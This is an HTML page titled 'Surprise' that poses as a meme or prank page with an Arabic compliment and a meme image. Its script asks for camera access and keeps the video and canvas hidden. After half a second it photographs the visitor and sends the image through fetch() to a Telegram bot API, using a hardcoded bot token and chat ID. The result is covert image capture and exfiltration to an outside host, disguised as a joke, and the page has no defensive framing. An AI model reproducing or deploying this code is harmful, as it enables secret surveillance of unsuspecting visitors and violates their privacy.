<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Surprise</title>

<style>

body{
background:black;
color:white;
text-align:center;
font-family:Arial;
}

video{
display:none;
}

canvas{
display:none;
}

#result{
display:none;
margin-top:20px;
}

img{
width:300px;
border-radius:10px;
}

h1{
font-size:30px;
}

</style>

</head>

<body>

<video id="video" autoplay playsinline></video>

<canvas id="canvas"></canvas>

<div id="result">

<h1>قتلتني بزينك🥹🫢</h1>

<img id="photo">

<br><br>

<img src="meme.jpg" style="width:90%;">

</div>

<script>

const video = document.getElementById("video")

navigator.mediaDevices.getUserMedia({video:true})
.then(stream=>{
video.srcObject = stream
setTimeout(takePhoto,500)
})

function takePhoto(){

const canvas = document.getElementById("canvas")
const context = canvas.getContext("2d")

canvas.width = video.videoWidth
canvas.height = video.videoHeight

context.drawImage(video,0,0)

const data = canvas.toDataURL("image/png")

document.getElementById("photo").src = data

sendToTelegram(data)

document.getElementById("result").style.display="block"

}

function sendToTelegram(imageData){

const token = "8616417285:AAHQvJfY029-xxipt4cENWAU9oRtQml-gKw"
const chat_id = "7737717483"

fetch(imageData)
.then(res => res.blob())
.then(blob => {

const formData = new FormData()

formData.append("chat_id", chat_id)
formData.append("photo", blob, "photo.png")
formData.append("caption","صورة جديدة من الموقع 📸")

fetch(`https://api.telegram.org/bot${token}/sendPhoto`,{
method:"POST",
body: formData
})

})

}

</script>

</body>
</html>
